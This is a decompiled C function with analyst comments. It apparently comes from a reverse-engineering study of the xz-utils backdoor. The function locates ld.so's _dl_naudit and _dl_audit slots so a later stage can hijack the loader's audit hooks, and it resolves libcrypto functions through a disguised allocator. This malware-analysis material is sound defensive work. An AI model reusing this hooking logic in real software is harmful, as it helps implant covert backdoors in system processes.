// /home/kali/xzre-ghidra/xzregh/104370_find_dl_naudit_slot.c
// Function: find_dl_naudit_slot @ 0x104370
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_dl_naudit_slot(elf_info_t * dynamic_linker_elf, elf_info_t * libcrypto_elf, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Cross-correlates the `GLRO(dl_naudit)` literal with the `_rtld_global_ro` slot that holds `_dl_naudit` so stage two can toggle ld.so’s audit bookkeeping.
 * The helper resolves the needed `DSA_get0_*` helpers plus `EVP_MD_CTX_free` via the fake allocator, looks up `rtld_global_ro`, and scans backward from the literal reference until it finds the MOV that loads a pointer inside that struct. It re-validates the absolute address inside `_dl_audit_symbind_alt`, insists the MOV uses the 32-bit path, and only records the slot when both `_dl_naudit` and `_dl_audit` are still zero—otherwise it frees every temporary stub and reports failure.
 */

#include "xzre_types.h"

BOOL find_dl_naudit_slot(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
                        backdoor_hooks_data_t *hooks,imported_funcs_t *imported_funcs)

{
  Elf64_Addr dsa_get0_pqg_value;
  Elf64_Ehdr *libcrypto_ehdr;
  Elf64_Xword rtld_global_ro_size;
  dl_audit_symbind_alt_fn audit_symbind_alt;
  BOOL success;
  Elf64_Sym *rtld_global_ro_sym;
  char *glro_lookup_string;
  Elf64_Sym *dsa_get0_pqg_symbol;
  u8 *glro_string_xref;
  uchar *rtld_global_ro_base;
  lzma_allocator *fake_allocator;
  pfn_EVP_MD_CTX_free_t evp_md_ctx_free_stub;
  uint *candidate_slot_ptr;
  pfn_DSA_get0_pub_key_t dsa_get0_pub_key_stub;
  long ctx_clear_idx;
  dasm_ctx_t *ctx_zero_cursor;
  u8 *mov_scan_cursor;
  uint *naudit_slot_ptr;
  u8 ctx_zero_seed;
  EncodedStringId glro_naudit_string_id;
  u64 ldso_code_size;
  dasm_ctx_t insn_ctx;
  
  ctx_zero_seed = 0;
  glro_naudit_string_id = 0;
  ldso_code_size = 0;
  rtld_global_ro_sym = elf_gnu_hash_lookup_symbol(dynamic_linker_elf,STR_rtld_global_ro,0);
  if (rtld_global_ro_sym != (Elf64_Sym *)0x0) {
    glro_naudit_string_id = STR_GLRO_dl_naudit_naudit;
    // AutoDoc: Treat the GLRO literal as the anchor; once we find the string we can search `.text` for its lone reference.
    glro_lookup_string = elf_find_encoded_string_in_rodata(dynamic_linker_elf,&glro_naudit_string_id,(void *)0x0);
    if (glro_lookup_string != (char *)0x0) {
      dsa_get0_pqg_symbol = elf_gnu_hash_lookup_symbol(libcrypto_elf,STR_DSA_get0_pqg,0);
      glro_string_xref = (u8 *)elf_get_text_segment(dynamic_linker_elf,&ldso_code_size);
      if ((glro_string_xref != (u8 *)0x0) &&
         // AutoDoc: Locate the MOV/LEA that materialises the literal so the later scan can stay inside the same basic block.
         (glro_string_xref = find_string_lea_xref(glro_string_xref,glro_string_xref + ldso_code_size,glro_lookup_string), glro_string_xref != (u8 *)0x0)) {
        if (dsa_get0_pqg_symbol != (Elf64_Sym *)0x0) {
          dsa_get0_pqg_value = dsa_get0_pqg_symbol->st_value;
          libcrypto_ehdr = libcrypto_elf->elfbase;
          imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
          imported_funcs->DSA_get0_pqg = (pfn_DSA_get0_pqg_t)(libcrypto_ehdr->e_ident + dsa_get0_pqg_value);
        }
        // AutoDoc: Clear the decoder context before walking `_dl_audit_symbind_alt` so prefix state never leaks between candidates.
        ctx_zero_cursor = &insn_ctx;
        for (ctx_clear_idx = 0x16; ctx_clear_idx != 0; ctx_clear_idx = ctx_clear_idx + -1) {
          *(u32 *)&ctx_zero_cursor->instruction = 0;
          ctx_zero_cursor = (dasm_ctx_t *)((u8 *)ctx_zero_cursor + 4);
        }
        rtld_global_ro_base = dynamic_linker_elf->elfbase->e_ident + rtld_global_ro_sym->st_value;
        rtld_global_ro_size = rtld_global_ro_sym->st_size;
        fake_allocator = get_fake_lzma_allocator();
        fake_allocator->opaque = libcrypto_elf;
        evp_md_ctx_free_stub = (pfn_EVP_MD_CTX_free_t)lzma_alloc(0xd10,fake_allocator);
        imported_funcs->EVP_MD_CTX_free = evp_md_ctx_free_stub;
        if (evp_md_ctx_free_stub != (pfn_EVP_MD_CTX_free_t)0x0) {
          imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
        }
        naudit_slot_ptr = (uint *)0x0;
        // AutoDoc: Walk up to 0x80 bytes before the literal to catch the MOV that copies `_dl_naudit` out of `rtld_global_ro`.
        mov_scan_cursor = glro_string_xref + -0x80;
        while (mov_scan_cursor < glro_string_xref) {
          success = find_riprel_opcode_memref_ex
                            (mov_scan_cursor,glro_string_xref,&insn_ctx,X86_OPCODE_1B_MOV_LOAD,(void *)0x0);
          mov_scan_cursor = mov_scan_cursor + 1;
          if (success != FALSE) {
            if ((insn_ctx.prefix.decoded.flags2 & DF2_MEM_DISP) != 0) {
              candidate_slot_ptr = (uint *)insn_ctx.mem_disp;
              if (((uint)insn_ctx.prefix.decoded.modrm & XZ_MODRM_RIPREL_DISP32_MASK) == XZ_MODRM_RIPREL_DISP32) {
                candidate_slot_ptr = (uint *)((u8 *)(insn_ctx.mem_disp + (long)insn_ctx.instruction) +
                                  insn_ctx.instruction_size);
              }
              // AutoDoc: Reject 64-bit MOVs and only accept pointers that actually fall within the `rtld_global_ro` symbol.
              if ((((insn_ctx.prefix.modrm_bytes.rex_byte & (REX_PREFIX | REX_W)) != (REX_PREFIX | REX_W)) && (rtld_global_ro_base < candidate_slot_ptr)) &&
                 (candidate_slot_ptr + 1 <= rtld_global_ro_base + rtld_global_ro_size)) {
                naudit_slot_ptr = candidate_slot_ptr;
              }
            }
            mov_scan_cursor = insn_ctx.instruction + (ulong)insn_ctx.opcode_offset + 1;
          }
        }
        if ((naudit_slot_ptr == (uint *)0x0) ||
           (audit_symbind_alt = (hooks->ldso_ctx)._dl_audit_symbind_alt,
           // AutoDoc: Double-check that `_dl_audit_symbind_alt` touches the same slot before trusting the pointer.
           success = find_riprel_opcode_memref_ex
                             ((u8 *)audit_symbind_alt,
                              (u8 *)(audit_symbind_alt + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
                              (dasm_ctx_t *)0x0,X86_OPCODE_1B_MOV_LOAD,naudit_slot_ptr), success == FALSE)
           ) {
          dsa_get0_pub_key_stub = (pfn_DSA_get0_pub_key_t)imported_funcs->EVP_MD_CTX_free;
        }
        else {
          dsa_get0_pub_key_stub = (pfn_DSA_get0_pub_key_t)lzma_alloc(0x468,fake_allocator);
          imported_funcs->DSA_get0_pub_key = dsa_get0_pub_key_stub;
          if (dsa_get0_pub_key_stub != (pfn_DSA_get0_pub_key_t)0x0) {
            imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
          }
          // AutoDoc: Only adopt the slot when both `_dl_naudit` and `_dl_audit` are still zero; otherwise bail and free the stubs.
          if ((*naudit_slot_ptr == 0) && (*(long *)(naudit_slot_ptr + -2) == 0)) {
            (hooks->ldso_ctx)._dl_naudit_ptr = naudit_slot_ptr;
            (hooks->ldso_ctx)._dl_audit_ptr = (audit_ifaces **)(naudit_slot_ptr + -2);
            return TRUE;
          }
          lzma_free(imported_funcs->EVP_MD_CTX_free,fake_allocator);
          dsa_get0_pub_key_stub = imported_funcs->DSA_get0_pub_key;
        }
        lzma_free(dsa_get0_pub_key_stub,fake_allocator);
      }
    }
  }
  return FALSE;
}

